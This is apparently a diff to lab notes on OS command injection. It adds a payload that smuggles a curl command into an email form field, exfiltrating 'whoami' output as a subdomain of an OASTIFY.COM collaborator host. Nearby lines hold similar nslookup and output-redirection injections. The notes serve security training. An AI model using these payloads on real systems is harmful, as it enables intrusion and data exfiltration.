@@ -4645,7 +4645,15 @@ email=peanut2019@nuts.net||nslookup+`whoami`.OASTIFY.COM||
 ||ls+-al>>/var/www/images/output.txt||
 ||echo>>output.txt||
 ||whoami>>/var/www/images/output.txt||
-```  
+```
+
+Also valid the payload:
+
+```bash
+email=carlos@exam.net||curl+`whoami`.OASTIFY.COM||
+```
+
+Where the `whoami` output is the subdomain of the collaborator server.
 
 >Use working directory discovered using above `pwd` command to redirect output and read content.  
 
